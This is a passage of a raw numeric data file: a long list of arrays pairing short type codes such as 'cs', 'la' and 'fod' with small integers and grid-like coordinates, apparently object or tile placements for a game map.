[1, "cs", 2, 158, 302, 1], [1, "cs", 2, 159, 302, 1], [1, "cs", 2, 157, 302, 1], [1, "cs", 2, 156, 303, 1], [1, "cs", 2, 157, 303, 1], [1, "cs", 2, 158, 303, 1], [1, "cs", 2, 157, 304, 1], [1, "cs", 2, 156, 304, 1], [1, "cs", 2, 155, 304, 1], [1, "cs", 2, 153, 304, 1], [1, "cs", 2, 153, 303, 1], [1, "cs", 2, 154, 303, 1], [1, "cs", 2, 154, 302, 1], [1, "cs", 2, 155, 302, 1], [1, "cs", 2, 152, 303, 1], [1, "cs", 2, 152, 302, 1], [1, "cs", 0, 151, 302, 1], [1, "cs", 0, 149, 303, 1], [1, "cs", 0, 145, 304, 1], [1, "cs", 0, 147, 302, 1], [1, "cs", 0, 143, 303, 1], [1, "cs", 0, 141, 303, 1], [1, "cs", 1, 147, 304, 1], [1, "cs", 1, 145, 302, 1], [1, "cs", 1, 142, 302, 1], [1, "cs", 1, 150, 304, 1], [1, "cs", 2, 151, 304, 1], [1, "cs", 2, 151, 303, 1], [1, "cs", 2, 150, 303, 1], [1, "cs", 2, 150, 302, 1], [1, "cs", 2, 148, 302, 1], [1, "cs", 2, 146, 302, 1], [1, "cs", 2, 144, 302, 1], [1, "cs", 2, 141, 302, 1], [1, "cs", 2, 141, 304, 1], [1, "cs", 2, 142, 304, 1], [1, "cs", 2, 142, 303, 1], [1, "cs", 2, 143, 304, 1], [1, "cs", 2, 144, 304, 1], [1, "cs", 2, 144, 303, 1], [1, "cs", 2, 148, 304, 1], [1, "cs", 2, 148, 303, 1], [1, "cs", 2, 146, 303, 1], [1, "cs", 2, 145, 303, 1], [1, "cs", 2, 147, 303, 1], [1, "cs", 2, 146, 304, 1], [1, "cs", 2, 149, 304, 1], [1, "cs", 3, 149, 302, 1], [1, "cs", 3, 143, 302, 1], [1, "cs", 0, 139, 304, 1], [1, "cs", 0, 138, 302, 1], [1, "cs", 1, 139, 302, 1], [1, "cs", 2, 140, 302, 1], [1, "cs", 2, 140, 303, 1], [1, "cs", 2, 139, 303, 1], [1, "cs", 2, 138, 303, 1], [1, "cs", 2, 138, 304, 1], [1, "cs", 2, 140, 304, 1], [1, "cs", 0, 137, 304, 1], [1, "cs", 0, 135, 303, 1], [1, "cs", 0, 133, 304, 1], [1, "cs", 1, 135, 304, 1], [1, "cs", 1, 136, 302, 1], [1, "cs", 2, 137, 302, 1], [1, "cs", 2, 136, 303, 1], [1, "cs", 2, 137, 303, 1], [1, "cs", 2, 136, 304, 1], [1, "cs", 2, 134, 304, 1], [1, "cs", 2, 134, 303, 1], [1, "cs", 2, 133, 303, 1], [1, "cs", 2, 132, 304, 1], [1, "cs", 0, 131, 302, 1], [1, "cs", 0, 134, 302, 1], [1, "cs", 0, 129, 304, 1], [1, "cs", 1, 130, 303, 1], [1, "cs", 1, 132, 302, 1], [1, "cs", 2, 135, 302, 1], [1, "cs", 2, 133, 302, 1], [1, "cs", 2, 132, 303, 1], [1, "cs", 2, 131, 303, 1], [1, "cs", 2, 130, 304, 1], [1, "cs", 2, 131, 304, 1], [1, "cs", 2, 128, 304, 1], [1, "cs", 2, 129, 303, 1], [1, "cs", 2, 130, 302, 1], [1, "cs", 3, 127, 304, 1], [1, "cs", 2, 132, 301, 1], [1, "cs", 2, 133, 301, 1], [1, "cs", 2, 134, 301, 1], [1, "cs", 2, 135, 301, 1], [1, "cs", 3, 131, 301, 1], [1, "cs", 3, 136, 301, 1], [1, "cs", 3, 136, 178, 1], [1, "cs", 0, 136, 183, 1], [1, "cs", 2, 136, 182, 1], [1, "cs", 1, 136, 181, 1], [1, "cs", 0, 136, 179, 1], [1, "cs", 3, 136, 180, 1], [1, "cs", 2, 135, 183, 1], [1, "cs", 1, 135, 182, 1], [1, "cs", 3, 135, 180, 1], [1, "cs", 0, 134, 183, 1], [1, "cs", 2, 133, 183, 1], [1, "cs", 3, 133, 182, 1], [1, "cs", 1, 132, 183, 1], [1, "cs", 3, 131, 183, 1], [1, "cs", 2, 135, 181, 1], [1, "cs", 2, 134, 182, 1], [1, "cs", 3, 134, 181, 1], [1, "fod", 0, 213, 301, 0], [1, "fod", 0, 204, 301, 0], [1, "fod", 1, 196, 288, 0], [1, "fod", 1, 198, 283, 0], [1, "fod", 1, 190, 288, 0], [1, "fod", 1, 189, 296, 0], [1, "fod", 1, 193, 293, 0], [1, "fod", 1, 183, 292, 0], [1, "fod", 1, 186, 287, 0], [1, "fod", 1, 190, 290, 0], [1, "fod", 1, 218, 271, 0], [1, "fod", 1, 220, 266, 0], [1, "fod", 1, 211, 268, 0], [1, "fod", 1, 210, 274, 0], [1, "fod", 1, 205, 263, 0], [1, "fod", 1, 216, 258, 0], [1, "fod", 2, 201, 294, 0], [1, "fod", 2, 190, 296, 0], [1, "fod", 2, 188, 299, 0], [1, "fod", 2, 186, 297, 0], [1, "fod", 2, 188, 296, 0], [1, "fod", 2, 189, 291, 0], [1, "fod", 2, 189, 286, 0], [1, "fod", 2, 191, 286, 0], [1, "fod", 2, 197, 286, 0], [1, "fod", 2, 195, 290, 0], [1, "fod", 2, 186, 288, 0], [1, "fod", 2, 184, 290, 0], [1, "fod", 2, 183, 293, 0], [1, "fod", 2, 198, 286, 0], [1, "fod", 2, 196, 283, 0], [1, "fod", 2, 196, 281, 0], [1, "fod", 2, 201, 280, 0], [1, "fod", 2, 205, 287, 0], [1, "fod", 2, 209, 283, 0], [1, "fod", 2, 212, 280, 0], [1, "fod", 2, 209, 277, 0], [1, "fod", 2, 217, 278, 0], [1, "fod", 2, 219, 275, 0], [1, "fod", 2, 220, 271, 0], [1, "fod", 2, 220, 267, 0], [1, "fod", 2, 217, 265, 0], [1, "fod", 2, 213, 267, 0], [1, "fod", 2, 208, 264, 0], [1, "fod", 2, 206, 261, 0], [1, "fod", 2, 203, 265, 0], [1, "fod", 2, 204, 270, 0], [1, "fod", 2, 196, 267, 0], [1, "fod", 2, 214, 261, 0], [1, "fod", 2, 211, 260, 0], [1, "fod", 2, 218, 256, 0], [1, "fod", 2, 219, 262, 0], [1, "fod", 2, 220, 253, 0], [1, "fod", 2, 211, 257, 0], [1, "la", 3, 198, 27, 1], [1, "la", 3, 201, 30, 1], [1, "la", 3, 200, 32, 1], [1, "la", 3, 198, 33, 1], [1, "la", 3, 196, 33, 1], [1, "la", 3, 194, 32, 1], [1, "la", 3, 194, 28, 1], [1, "la", 0, 200, 28, 1], [1, "la", 0, 193, 30, 1], [1, "la", 3, 196, 27, 1], [1, "la", 3, 199, 30, 1], [1, "la", 3, 197, 29, 1], [1, "la", 3, 195, 30, 1], [1, "la", 3, 197, 31, 1], [1, "la", 2, 201, 33, 1], [1, "la", 4, 202, 34, 1], [1, "la", 4, 202, 35, 1], [1, "la", 4, 203, 36, 1], [1, "la", 4, 204, 37, 1], [1, "la", 2, 205, 38, 1], [1, "la", 5, 205, 39, 1], [1, "la", 5, 205, 40, 1], [1, "la", 2, 206, 41, 1], [1, "la", 1, 207, 42, 1], [1, "la", 1, 205, 41, 1], [1, "la", 4, 208, 43, 1], [1, "la", 4, 209, 43, 1], [1, "la", 1, 210, 43, 1], [1, "la", 2, 211, 43, 1], [1, "la", 5, 212, 43, 1], [1, "la", 4, 213, 44, 1], [1, "la", 3, 223, 54, 1], [1, "la", 3, 221, 53, 1], [1, "la", 3, 219, 53, 1], [1, "la", 4, 218, 52, 1], [1, "la", 4, 217, 51, 1], [1, "la", 4, 216, 51, 1], [1, "la", 1, 215, 50, 1], [1, "la", 4, 212, 46, 1], [1, "la", 1, 210, 44, 1], [1, "la", 3, 206, 50, 1], [1, "re", 0, 217, 24, 1], [1, "re", 0, 207, 16, 1], [1, "de", 44, 54, 14, 0], [1, "de", 44, 53, 13, 0], [1, "de", 44, 51, 16, 0], [1, "de", 44, 49, 13, 0], [1, "de", 44, 48, 14, 0], [1, "de", 21, 78, 293, 0], [1, "cs", 0, 221, 8, 1], [1, "cs", 0, 224, 9, 1], [1, "cs", 1, 223, 8, 1], [1, "cs", 2, 224, 8, 1], [1, "cs", 2, 222, 8, 1], [1, "cs", 0, 224, 6, 1], [1, "cs", 0, 222, 5, 1], [1, "cs", 0, 219, 7, 1], [1, "cs", 1, 220, 5, 1], [1, "cs", 1, 217, 7, 1], [1, "cs", 2, 224, 5, 1], [1, "cs", 2, 223, 5, 1], [1, "cs", 2, 224, 7, 1], [1, "cs", 2, 223, 7, 1], [1, "cs", 2, 223, 6, 1], [1, "cs", 2, 222, 6, 1], [1, "cs", 2, 222, 7, 1], [1, "cs", 2, 221, 7, 1], [1, "cs", 2, 221, 6, 1], [1, "cs", 2, 221, 5, 1], [1, "cs", 2, 220, 6, 1], [1, "cs", 2, 220, 7, 1], [1, "cs", 2, 220, 8, 1], [1, "cs", 2, 219, 8, 1], [1, "cs", 2, 219, 6, 1], [1, "cs", 2, 219, 5, 1], [1, "cs", 0, 218, 5, 1], [1, "cs", 0, 216, 8, 1], [1, "cs", 2, 218, 8, 1], [1, "cs", 2, 217, 8, 1], [1, "cs", 2, 218, 7, 1], [1, "cs", 2, 218, 6, 1], [1, "cs", 2, 217, 6, 1], [1, "cs", 2, 217, 5, 1], [1, "cs", 1, 215, 6, 1], [1, "cs", 1, 213, 5, 1], [1, "cs", 0, 214, 6, 1], [1, "cs", 0, 216, 5, 1], [1, "cs", 0, 213, 8, 1], [1, "cs", 0, 211, 7, 1], [1, "cs", 0, 209, 5, 1], [1, "cs", 0, 208, 7, 1], [1, "cs", 0, 207, 8, 1], [1, "cs", 2, 216, 6, 1], [1, "cs", 2, 216, 7, 1], [1, "cs", 2, 215, 7, 1], [1, "cs", 2, 215, 8, 1], [1, "cs", 2, 214, 8, 1], [1, "cs", 2, 214, 7, 1], [1, "cs", 2, 215, 5, 1], [1, "cs", 2, 214, 5, 1], [1, "cs", 2, 213, 6, 1], [1, "cs", 2, 213, 7, 1], [1, "cs", 2, 212, 7, 1], [1, "cs", 1, 211, 5, 1], [1, "cs", 1, 209, 8, 1], [1, "cs", 2, 212, 8, 1], [1, "cs", 2, 211, 8, 1], [1, "cs", 2, 210, 8, 1], [1, "cs", 2, 209, 7, 1], [1, "cs", 2, 210, 7, 1], [1, "cs", 2, 210, 6, 1], [1, "cs", 2, 212, 6, 1], [1, "cs", 2, 212, 5, 1], [1, "cs", 2, 211, 6, 1], [1, "cs", 2, 210, 5, 1], [1, "cs", 2, 209, 6, 1], [1, "cs", 2, 208, 6, 1], [1, "cs", 2, 208, 5, 1], [1, "cs", 2, 207, 7, 1], [1, "cs", 2, 207, 6, 1], [1, "cs", 2, 207, 5, 1], [1, "cs", 2, 206, 5, 1], [1, "cs", 2, 208, 8, 1], [1, "cs", 2, 206, 6, 1], [1, "cs", 0, 204, 8, 1], [1, "cs", 0, 205, 6, 1], [1, "cs", 0, 203, 5, 1], [1, "cs", 0, 202, 7, 1], [1, "cs", 0, 199, 8, 1], [1, "cs", 0, 200, 6, 1], [1, "cs", 0, 197, 6, 1], [1, "cs", 0, 195, 8, 1], [1, "cs", 0, 194, 6, 1], [1, "cs", 1, 202, 8, 1], [1, "cs", 1, 206, 7, 1], [1, "cs", 1, 201, 5, 1], [1, "cs", 1, 197, 8, 1], [1, "cs", 1, 192, 7, 1], [1, "cs", 1, 195, 5, 1], [1, "cs", 2, 205, 7, 1], [1, "cs", 2, 205, 8, 1], [1, "cs", 2, 206, 8, 1], [1, "cs", 2, 204, 7, 1], [1, "cs", 2, 204, 6, 1], [1, "cs", 2, 204, 5, 1], [1, "cs", 2, 205, 5, 1], [1, "cs", 2, 203, 6, 1], [1, "cs", 2, 203, 7, 1], [1, "cs", 2, 203, 8, 1], [1, "cs", 2, 201, 8, 1], [1, "cs", 2, 200, 8, 1], [1, "cs", 2, 200, 7, 1], [1, "cs", 2, 201, 7, 1], [1, "cs", 2, 201, 6, 1], [1, "cs", 2, 202, 5, 1], [1, "cs", 2, 202, 6, 1], [1, "cs", 2, 200, 5, 1], [1, "cs", 2, 199, 5, 1], [1, "cs", 2, 197, 5, 1], [1, "cs", 2, 196, 5, 1], [1, "cs", 2, 198, 5, 1], [1, "cs", 2, 198, 6, 1], [1, "cs", 2, 199, 6, 1], [1, "cs", 2, 199, 7, 1], [1, "cs", 2, 198, 7, 1], [1, "cs", 2, 198, 8, 1], [1, "cs", 2, 197, 7, 1], [1, "cs", 2, 196, 7, 1], [1, "cs", 2, 196, 8, 1], [1, "cs", 2, 196, 6, 1], [1, "cs", 2, 195, 6, 1], [1, "cs", 2, 195, 7, 1], [1, "cs", 2, 194, 7, 1], [1, "cs", 2, 193, 8, 1], [1, "cs", 2, 194, 8, 1], [1, "cs", 2, 193, 7, 1], [1, "cs", 2, 193, 6, 1], [1, "cs", 2, 193, 5, 1], [1, "cs", 2, 194, 5, 1], [1, "cs", 0, 192, 5, 1], [1, "cs", 0, 191, 8, 1], [1, "cs", 0, 190, 6, 1], [1, "cs", 0, 188, 7, 1], [1, "cs", 0, 186, 8, 1], [1, "cs", 0, 186, 5, 1], [1, "cs", 0, 184, 7, 1], [1, "cs", 0, 182, 8, 1], [1, "cs", 0, 181, 6, 1], [1, "cs", 1, 189, 8, 1], [1, "cs", 1, 183, 8, 1], [1, "cs", 1, 188, 5, 1], [1, "cs", 1, 185, 6, 1], [1, "cs", 1, 180, 7, 1], [1, "cs", 1, 183, 5, 1], [1, "cs", 1, 178, 8, 1], [1, "cs", 1, 177, 6, 1], [1, "cs", 1, 173, 7, 1], [1, "cs", 1, 171, 7, 1], [1, "cs", 0, 177, 8, 1], [1, "cs", 0, 175, 7, 1], [1, "cs", 0, 179, 5, 1], [1, "cs", 0, 174, 5, 1], [1, "cs", 0, 176, 5, 1], [1, "cs", 0, 172, 8, 1], [1, "cs", 0, 170, 8, 1], [1, "cs", 0, 169, 6, 1], [1, "cs", 2, 192, 6, 1], [1, "cs", 2, 192, 8, 1], [1, "cs", 2, 191, 7, 1], [1, "cs", 2, 191, 6, 1], [1, "cs", 2, 191, 5, 1], [1, "cs", 2, 190, 5, 1], [1, "cs", 2, 189, 5, 1], [1, "cs", 2, 189, 6, 1], [1, "cs", 2, 189, 7, 1], [1, "cs", 2, 190, 7, 1], [1, "cs", 2, 190, 8, 1], [1, "cs", 2, 188, 8, 1], [1, "cs", 2, 187, 8, 1], [1, "cs", 2, 187, 7, 1], [1, "cs", 2, 187, 6, 1], [1, "cs", 2, 188, 6, 1], [1, "cs", 2, 187, 5, 1], [1, "cs", 2, 186, 6, 1], [1, "cs", 2, 186, 7, 1], [1, "cs", 2, 185, 7, 1], [1, "cs", 2, 185, 8, 1], [1, "cs", 2, 184, 8, 1], [1, "cs", 2, 183, 7, 1], [1, "cs", 2, 183, 6, 1], [1, "cs", 2, 184, 6, 1], [1, "cs", 2, 184, 5, 1], [1, "cs", 2, 185, 5, 1], [1, "cs", 2, 182, 6, 1], [1, "cs", 2, 182, 7, 1], [1, "cs", 2, 181, 7, 1], [1, "cs", 2, 181, 8, 1], [1, "cs", 2, 180, 8, 1], [1, "cs", 2, 179, 8, 1], [1, "cs", 2, 182, 5, 1], [1, "cs", 2, 181, 5, 1], [1, "cs", 2, 180, 5, 1], [1, "cs", 2, 180, 6, 1], [1, "cs", 2, 179, 6, 1], [1, "cs", 2, 179, 7, 1], [1, "cs", 2, 178, 7, 1], [1, "cs", 2, 178, 6, 1], [1, "cs", 2, 178, 5, 1], [1, "cs", 2, 177, 5, 1], [1, "cs", 2, 177, 7, 1], [1, "cs", 2, 176, 7, 1], [1, "cs", 2, 176, 6, 1], [1, "cs", 2, 175, 6, 1], [1, "cs", 2, 175, 5, 1], [1, "cs", 2, 176, 8, 1], [1, "cs", 2, 174, 8, 1], [1, "cs", 2, 175, 8, 1], [1, "cs", 2, 173, 8, 1], [1, "cs", 2, 174, 7, 1], [1, "cs", 2, 173, 6, 1], [1, "cs", 2, 174, 6, 1], [1, "cs", 2, 172, 5, 1], [1, "cs", 2, 173, 5, 1], [1, "cs", 2, 172, 6, 1], [1, "cs", 2, 172, 7, 1], [1, "cs", 2, 171, 8, 1], [1, "cs", 2, 170, 7, 1], [1, "cs", 2, 170, 6, 1], [1, "cs", 2, 170, 5, 1], [1, "cs", 2, 171, 5, 1], [1, "cs", 2, 171, 6, 1], [1, "cs", 2, 169, 5, 1], [1, "cs", 2, 169, 7, 1], [1, "cs", 2, 169, 8, 1], [1, "cs", 1, 168, 7, 1], [1, "cs", 1, 166, 5, 1], [1, "cs", 1, 164, 7, 1], [1, "cs", 1, 160, 7, 1], [1, "cs", 1, 156, 8, 1], [1, "cs", 0, 166, 8, 1], [1, "cs", 0, 168, 5, 1], [1, "cs", 0, 164, 6, 1], [1, "cs", 0, 162, 7, 1], [1, "cs", 0, 158, 8, 1], [1, "cs", 0, 157, 6, 1], [1, "cs", 0, 161, 5, 1], [1, "cs", 0, 159, 5, 1], [1, "cs", 0, 155, 7, 1], [1, "cs", 0, 154, 5, 1], [1, "cs", 0, 151, 7, 1], [1, "cs", 1, 153, 8, 1], [1, "cs", 1, 151, 5, 1], [1, "cs", 2, 168, 6, 1], [1, "cs", 2, 168, 8, 1], [1, "cs", 2, 167, 8, 1], [1, "cs", 2, 167, 7, 1], [1, "cs", 2, 167, 6, 1], [1, "cs", 2, 167, 5, 1], [1, "cs", 2, 166, 6, 1], [1, "cs", 2, 166, 7, 1], [1, "cs", 2, 165, 7, 1], [1, "cs", 2, 165, 6, 1], [1, "cs", 2, 165, 5, 1], [1, "cs", 2, 164, 5, 1], [1, "cs", 2, 163, 5, 1], [1, "cs", 2, 162, 5, 1], [1, "cs", 2, 162, 6, 1], [1, "cs", 2, 163, 6, 1], [1, "cs", 2, 163, 7, 1], [1, "cs", 2, 163, 8, 1], [1, "cs", 2, 164, 8, 1], [1, "cs", 2, 165, 8, 1], [1, "cs", 2, 161, 8, 1], [1, "cs", 2, 162, 8, 1], [1, "cs", 2, 160, 8, 1], [1, "cs", 2, 159, 8, 1], [1, "cs", 2, 159, 7, 1], [1, "cs", 2, 159, 6, 1], [1, "cs", 2, 160, 5, 1], [1, "cs", 2, 160, 6, 1], [1, "cs", 2, 161, 6, 1], [1, "cs", 2, 161, 7, 1], [1, "cs", 2, 157, 7, 1], [1, "cs", 2, 158, 7, 1], [1, "cs", 2, 158, 6, 1], [1, "cs", 2, 158, 5, 1], [1, "cs", 2, 155, 5, 1], [1, "cs", 2, 155, 6, 1], [1, "cs", 2, 156, 6, 1], [1, "cs", 2, 156, 7, 1], [1, "cs", 2, 157, 8, 1], [1, "cs", 2, 155, 8, 1], [1, "cs", 2, 154, 8, 1], [1, "cs", 2, 154, 7, 1], [1, "cs", 2, 154, 6, 1], [1, "cs", 2, 152, 8, 1], [1, "cs", 2, 153, 7, 1], [1, "cs", 2, 153, 6, 1], [1, "cs", 2, 153, 5, 1], [1, "cs", 2, 152, 5, 1], [1, "cs", 2, 152, 6, 1], [1, "cs", 2, 152, 7, 1], [1, "cs", 2, 151, 6, 1], [1, "cs", 2, 157, 5, 1], [1, "cs", 1, 156, 5, 1], [1, "cs", 0, 150, 5, 1], [1, "cs", 0, 149, 7, 1], [1, "cs", 0, 147, 8, 1], [1, "cs", 0, 146, 5, 1], [1, "cs", 0, 144, 7, 1], [1, "cs", 0, 142, 5, 1], [1, "cs", 1, 147, 6, 1], [1, "cs", 1, 145, 8, 1], [1, "cs", 1, 144, 5, 1], [1, "cs", 2, 148, 5, 1], [1, "cs", 2, 149, 5, 1], [1, "cs", 2, 150, 6, 1], [1, "cs", 2, 150, 8, 1], [1, "cs", 2, 151, 8, 1], [1, "cs", 2, 150, 7, 1], [1, "cs", 2, 149, 8, 1], [1, "cs", 2, 148, 8, 1], [1, "cs", 2, 149, 6, 1], [1, "cs", 2, 148, 6, 1], [1, "cs", 2, 148, 7, 1], [1, "cs", 2, 147, 7, 1], [1, "cs", 2, 147, 5, 1], [1, "cs", 2, 146, 6, 1], [1, "cs", 2, 146, 7, 1], [1, "cs", 2, 146, 8, 1], [1, "cs", 2, 145, 7, 1], [1, "cs", 2, 145, 6, 1], [1, "cs", 2, 145, 5, 1], [1, "cs", 2, 144, 6, 1], [1, "cs", 2, 143, 5, 1], [1, "cs", 2, 143, 6, 1], [1, "cs", 2, 142, 6, 1], [1, "cs", 2, 141, 5, 1], [1, "cs", 2, 224, 10, 1], [1, "cs", 0, 224, 11, 1], [1, "cs", 0, 224, 13, 1], [1, "cs", 0, 224, 17, 1], [1, "cs", 0, 224, 19, 1], [1, "cs", 0, 224, 22, 1], [1, "cs", 0, 224, 24, 1], [1, "cs", 0, 224, 29, 1], [1, "cs", 0, 224, 33, 1], [1, "cs", 0, 224, 35, 1], [1, "cs", 0, 224, 38, 1], [1, "cs", 1, 224, 14, 1], [1, "cs", 1, 224, 20, 1], [1, "cs", 1, 224, 27, 1], [1, "cs", 1, 224, 31, 1], [1, "cs", 1, 224, 36, 1], [1, "cs", 2, 224, 12, 1], [1, "cs", 2, 224, 15, 1], [1, "cs", 2, 224, 16, 1], [1, "cs", 2, 224, 18, 1], [1, "cs", 2, 224, 21, 1], [1, "cs", 2, 224, 23, 1], [1, "cs", 2, 224, 25, 1], [1, "cs", 2, 224, 26, 1], [1, "cs", 2, 224, 28, 1], [1, "cs", 2, 224, 30, 1], [1, "cs", 2, 224, 32, 1], [1, "cs", 2, 224, 34, 1], [1, "cs", 2, 224, 37, 1], [1, "cs", 2, 224, 39, 1], [1, "cs", 0, 224, 41, 1], [1, "cs", 0, 224, 44, 1], [1, "cs", 0, 224, 46, 1], [1, "cs", 0, 224, 52, 1], [1, "cs", 0, 224, 57, 1], [1, "cs", 1, 224, 47, 1], [1, "cs", 2, 224, 40, 1], [1, "cs", 2, 224, 42, 1], [1, "cs", 2, 224, 43, 1], [1, "cs", 2, 224, 45, 1], [1, "cs", 2, 224, 49, 1], [1, "cs", 1, 224, 50, 1], [1, "cs", 2, 224, 51, 1], [1, "la", 3, 224, 54, 1], [1, "cs", 2, 224, 56, 1], [1, "cs", 2, 224, 58, 1], [1, "cs", 2, 224, 61, 1], [1, "cs", 0, 224, 60, 1], [1, "cs", 0, 224, 64, 1], [1, "cs", 0, 224, 66, 1], [1, "cs", 0, 224, 70, 1], [1, "cs", 0, 224, 74, 1], [1, "cs", 0, 224, 77, 1], [1, "cs", 1, 224, 62, 1], [1, "cs", 1, 224, 68, 1], [1, "cs", 1, 224, 72, 1], [1, "cs", 1, 224, 76, 1], [1, "cs", 1, 224, 80, 1], [1, "cs", 1, 224, 83, 1], [1, "cs", 1, 224, 91, 1], [1, "cs", 1, 224, 95, 1], [1, "cs", 1, 224, 97, 1], [1, "cs", 0, 224, 85, 1], [1, "cs", 0, 224, 88, 1], [1, "cs", 0, 224, 93, 1], [1, "cs", 0, 224, 98, 1], [1, "cs", 2, 224, 59, 1], [1, "cs", 2, 224, 63, 1], [1, "cs", 2, 224, 65, 1], [1, "cs", 2, 224, 67, 1], [1, "cs", 2, 224, 69, 1], [1, "cs", 2, 224, 71, 1], [1, "cs", 2, 224, 73, 1], [1, "cs", 2, 224, 75, 1], [1, "cs", 2, 224, 78, 1], [1, "cs", 2, 224, 79, 1], [1, "cs", 2, 224, 81, 1], [1, "cs", 2, 224, 82, 1], [1, "cs", 2, 224, 84, 1], [1, "cs", 2, 224, 86, 1], [1, "cs", 2, 224, 87, 1], [1, "cs", 2, 224, 89, 1], [1, "cs", 2, 224, 90, 1], [1, "cs", 2, 224, 92, 1], [1, "cs", 2, 224, 94, 1], [1, "cs", 2, 224, 96, 1], [1, "cs", 2, 224, 99, 1], [1, "cs", 2, 224, 100, 1], [1, "cs", 0, 224, 101, 1], [1, "cs", 1, 224, 103, 1], [1, "cs", 2, 224, 102, 1], [1, "cs", 0, 222, 10, 1], [1, "cs", 2, 223, 9, 1], [1, "cs", 2, 222, 9, 1], [1, "cs", 2, 221, 9, 1], [1, "cs", 2, 223, 10, 1], [1, "cs", 2, 223, 11, 1], [1, "cs", 2, 223, 12, 1], [1, "cs", 3, 223, 13, 1], [1, "cs", 3, 222, 11, 1], [1, "cs", 3, 220, 9, 1], [1, "cs", 3, 219, 9, 1], [1, "cs", 3, 221, 10, 1], [1, "re", 2, 219, 13, 1], [1, "re", 1, 218, 18, 1], [1, "re", 1, 214, 13, 1], [1, "cs", 0, 221, 20, 1], [1, "cs", 1, 223, 18, 1], [1, "cs", 2, 222, 19, 1], [1, "cs", 2, 223, 19, 1], [1, "cs", 2, 223, 20, 1], [1, "cs", 2, 222, 20, 1], [1, "cs", 2, 220, 21, 1], [1, "cs", 0, 219, 21, 1], [1, "cs", 3, 221, 21, 1], [1, "cs", 3, 218, 21, 1], [1, "cs", 3, 222, 21, 1], [1, "cs", 3, 220, 22, 1], [1, "cs", 3, 219, 22, 1], [1, "cs", 3, 221, 22, 1], [1, "cs", 0, 211, 9, 1], [1, "cs", 1, 211, 10, 1], [1, "cs", 1, 210, 12, 1], [1, "cs", 0, 211, 13, 1], [1, "cs", 2, 210, 9, 1], [1, "cs", 2, 210, 10, 1], [1, "cs", 2, 210, 11, 1], [1, "cs", 2, 212, 9, 1], [1, "cs", 2, 210, 13, 1], [1, "cs", 2, 211, 12, 1], [1, "cs", 2, 211, 11, 1], [1, "cs", 2, 211, 14, 1], [1, "cs", 2, 212, 15, 1], [1, "cs", 2, 210, 14, 1], [1, "cs", 3, 211, 15, 1], [1, "cs", 3, 213, 9, 1], [1, "cs", 3, 212, 10, 1], [1, "cs", 3, 223, 21, 1], [1, "cs", 3, 209, 9, 1], [1, "la", 3, 223, 22, 1], [1, "la", 3, 221, 23, 1], [1, "la", 3, 207, 9, 1], [1, "la", 3, 209, 10, 1], [1, "la", 0, 209, 12, 1], [1, "la", 4, 209, 14, 1], [1, "la", 4, 219, 23, 1], [1, "la", 3, 210, 15, 1], [1, "la", 3, 217, 22, 1], [1, "la", 4, 212, 16, 1], [1, "la", 2, 214, 19, 1], [1, "la", 4, 213, 20, 1], [1, "la", 1, 212, 21, 1], [1, "la", 4, 215, 18, 1], [1, "la", 2, 216, 17, 1], [1, "la", 5, 216, 16, 1], [1, "la", 5, 216, 15, 1], [1, "la", 1, 217, 16, 1], [1, "la", 2, 218, 16, 1], [1, "la", 2, 216, 14, 1], [1, "la", 2, 219, 16, 1], [1, "la", 5, 220, 16, 1], [1, "la", 5, 216, 13, 1], [1, "la", 4, 217, 15, 1], [1, "cs", 0, 211, 44, 1], [1, "cs", 1, 212, 45, 1], [1, "cs", 2, 213, 45, 1], [1, "cs", 0, 214, 46, 1], [1, "cs", 2, 215, 46, 1], [1, "cs", 3, 213, 46, 1], [1, "cs", 3, 214, 47, 1], [1, "cs", 3, 214, 48, 1], [1, "cs", 3, 216, 46, 1], [1, "cs", 0, 208, 20, 1], [1, "cs", 0, 210, 21, 1], [1, "cs", 0, 212, 23, 1], [1, "cs", 0, 213, 25, 1], [1, "cs", 2, 213, 24, 1], [1, "cs", 2, 211, 22, 1], [1, "cs", 2, 210, 20, 1], [1, "cs", 2, 209, 21, 1], [1, "cs", 2, 209, 20, 1], [1, "cs", 2, 211, 21, 1], [1, "cs", 2, 212, 22, 1], [1, "cs", 2, 213, 23, 1], [1, "cs", 3, 213, 26, 1], [1, "cs", 3, 207, 20, 1], [1, "la", 4, 192, 33, 1], [1, "la", 4, 191, 34, 1], [1, "la", 4, 190, 35, 1], [1, "la", 3, 189, 37, 1], [1, "la", 3, 188, 39, 1], [1, "la", 4, 186, 40, 1], [1, "la", 4, 185, 39, 1], [1, "la", 4, 184, 39, 1], [1, "la", 2, 183, 39, 1], [1, "la", 1, 182, 40, 1], [1, "la", 2, 181, 41, 1], [1, "la", 5, 180, 41, 1], [1, "la", 5, 179, 41, 1], [1, "la", 4, 192, 28, 1], [1, "la", 4, 191, 28, 1], [1, "la", 4, 190, 27, 1], [1, "la", 3, 188, 27, 1], [1, "la", 4, 187, 26, 1], [1, "la", 4, 186, 25, 1], [1, "la", 4, 185, 25, 1], [1, "la", 4, 184, 24, 1], [1, "la", 5, 184, 23, 1], [1, "la", 2, 184, 22, 1], [1, "la", 5, 184, 21, 1], [1, "la", 1, 183, 20, 1], [1, "la", 5, 182, 20, 1], [1, "la", 2, 181, 20, 1], [1, "la", 5, 180, 20, 1], [1, "la", 2, 179, 20, 1], [1, "la", 4, 178, 19, 1], [1, "la", 3, 178, 17, 1], [1, "la", 3, 176, 18, 1], [1, "cs", 0, 177, 15, 1], [1, "cs", 0, 175, 17, 1], [1, "cs", 0, 180, 16, 1], [1, "cs", 0, 174, 19, 1], [1, "cs", 0, 172, 20, 1], [1, "cs", 1, 175, 15, 1], [1, "cs", 1, 172, 18, 1], [1, "cs", 1, 181, 15, 1], [1, "cs", 2, 179, 15, 1], [1, "cs", 2, 177, 16, 1], [1, "cs", 2, 176, 16, 1], [1, "cs", 2, 174, 18, 1], [1, "cs", 2, 173, 19, 1], [1, "cs", 2, 172, 19, 1], [1, "cs", 2, 173, 18, 1], [1, "cs", 2, 173, 17, 1], [1, "cs", 2, 174, 17, 1], [1, "cs", 2, 174, 16, 1], [1, "cs", 2, 175, 16, 1], [1, "cs", 2, 176, 15, 1], [1, "cs", 2, 178, 15, 1], [1, "cs", 2, 178, 16, 1], [1, "cs", 2, 179, 16, 1], [1, "cs", 2, 180, 15, 1], [1, "cs", 2, 181, 16, 1], [1, "cs", 3, 182, 16, 1], [1, "cs", 3, 172, 21, 1], [1, "la", 1, 175, 19, 1], [1, "la", 2, 174, 20, 1], [1, "la", 2, 173, 20, 1], [1, "la", 1, 180, 17, 1], [1, "la", 2, 181, 17, 1], [1, "la", 3, 191, 20, 1], [1, "s", 0, 217, 30, 1], [1, "s", 0, 208, 35, 1], [1, "s", 0, 204, 24, 1], [1, "s", 1, 218, 